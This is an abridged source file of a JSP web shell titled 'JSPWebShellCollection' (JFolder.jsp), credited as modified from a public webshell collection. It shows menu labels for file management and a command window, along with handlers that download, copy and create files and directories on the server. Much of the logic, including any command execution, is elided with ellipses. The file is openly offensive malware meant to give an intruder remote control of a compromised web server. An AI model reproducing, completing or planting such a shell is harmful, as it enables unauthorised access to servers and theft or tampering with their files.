<%
/**
Modified by Mane, source in https://github.com/tennc/webshell/blob/master/www-7jyewu-cn/%E9%9D%9E%E5%B8%B8%E7%89%9B%E9%80%BC%E7%9A%84Jsp%E5%A4%A7%E9%A9%AC.jsp
*/
%>
...
<%!
private final static int languageNo=1; 
String strThisFile="JFolder.jsp";
String[] authorInfo={" <font color=red> JSPWebShellCollection </font>",""};
String[] strFileManage   = {"","File Management"};
String[] strCommand      = {"","Command Window"};
...
if(strAction!=null && strAction.equals("down"))
{
 ...
 if(f.length()==0)
 {
  sbDown.append("[ERROR] The file size 0 byte.");
 }
 else
 {
...
if(strAction!=null && strAction.equals("savecopy"))
{
 ...
 {
  sbSaveCopy.append("<p><font color=red>Target have ERROR!</font>");
 }
 else
 {
  ...
  if(f_des.isFile())
  {
   sbSaveCopy.append("<p><font color=red>The target file already exists and cannot be copied.</font>");
  }
  else
  {
   ...
   sbSaveCopy.append("<font color=red>Operation successful!</font>");   
  }  
 } 
 sbSaveCopy.append("<p><input type=button name=saveCopyBack onclick='history.back(-2);' value=Back>");
}
if(strAction!=null && strAction.equals("newFile"))
{
 ...
 {  
   ...
   if(strType.equals("File") && !f_new.createNewFile())
    sbNewFile.append(strF+" File creation failure.");
   if(strType.equals("Dir") && !f_new.mkdirs())
    sbNewFile.append(strF+" Directory creation failure.");
 }
 else
 {
  sbNewFile.append("<p><font color=red>Error creating a file or directory.</font>");
 }
}
...
<title>JSPWebShellCollection</title>
<head>
